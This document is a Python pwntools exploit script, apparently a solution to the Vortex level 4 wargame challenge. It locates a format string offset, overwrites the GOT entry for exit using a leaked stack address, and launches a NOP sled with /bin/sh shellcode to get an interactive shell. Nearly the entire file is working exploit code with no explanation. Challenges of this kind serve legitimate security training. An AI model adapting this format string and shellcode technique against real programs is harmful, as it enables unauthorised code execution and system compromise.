from pwn import *
from libformatstr import FormatStr

context.arch='i386'
context.os='linux'

def run(payload, prog='./vortex4-fixed', interactive=False):
    p = process([prog, '', '', payload])
    if interactive:
        p.interactive()
    else:
        return p.recvall()

def get_offset(size=100, start=1, end=201):
    offsets = []

    for x in xrange(start, end):
        payload = 'A' * 8 + '%%%d$p' % x
        payload += 'X' * (size - len(payload))
        assert size == len(payload)
        output = run(payload)

        if output.startswith('A' * 8 + '0x41414141'):
            offsets.append(x)

    for offset in offsets:
        for shift in xrange(4):
            payload = "X" * shift + 'ABCD' + '%%%d$p' % offset
            payload += 'X' * (size - len(payload))
            assert size == len(payload)

            output = run(payload)

            if output.startswith('X' * shift + 'ABCD0x44434241'):
                return offset, shift

    raise PwnlibException('Could not find valid offset')

size = 200

exe = ELF('./vortex4')

leaked = int(run('X' * size, prog='./leaker'), base=16)

offset, padding = get_offset(size=size, start=100)

f = FormatStr()
f[exe.got['exit']] = leaked + 50

fmt = f.payload(offset, padding=padding)

shellcode = fmt + asm(shellcraft.nop() * 50 + shellcraft.sh())
shellcode += 'X' * (size - len(shellcode))

assert len(shellcode) == size

log.info('Offset: %d', offset)
log.info('Padding: %d', padding)
log.info('Ptr: 0x%x', leaked)
log.info('GOT: 0x%x', exe.got['exit'])
log.info('Payload: %s', repr(shellcode))

run(shellcode, interactive=True)
